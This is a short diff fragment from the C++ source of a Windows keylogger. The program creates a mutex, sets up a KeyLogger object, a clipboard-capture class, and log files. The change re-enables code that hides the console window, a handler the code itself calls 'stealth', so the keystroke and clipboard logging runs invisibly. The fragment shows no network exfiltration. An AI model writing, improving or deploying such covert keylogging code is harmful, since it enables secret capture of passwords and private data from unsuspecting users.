@@ -22,10 +22,10 @@ int main(int argc, char * argv[])
 {
 	CreateMutex(NULL, TRUE, "8154d1e24f699f5b217f5ebc8c8c823c");
 	if (GetLastError() != ERROR_ALREADY_EXISTS) {
-		//HWND stealth; // window handler used to hide the outputted console window
-		//AllocConsole();
-		//stealth = FindWindowA("ConsoleWindowClass", NULL);
-		//ShowWindow(stealth, 0);
+		HWND stealth; // window handler used to hide the outputted console window
+		AllocConsole();
+		stealth = FindWindowA("ConsoleWindowClass", NULL);
+		ShowWindow(stealth, 0);
 		std::fstream logFile, clipFile;
 		KeyLogger k;
 		CClip cp;
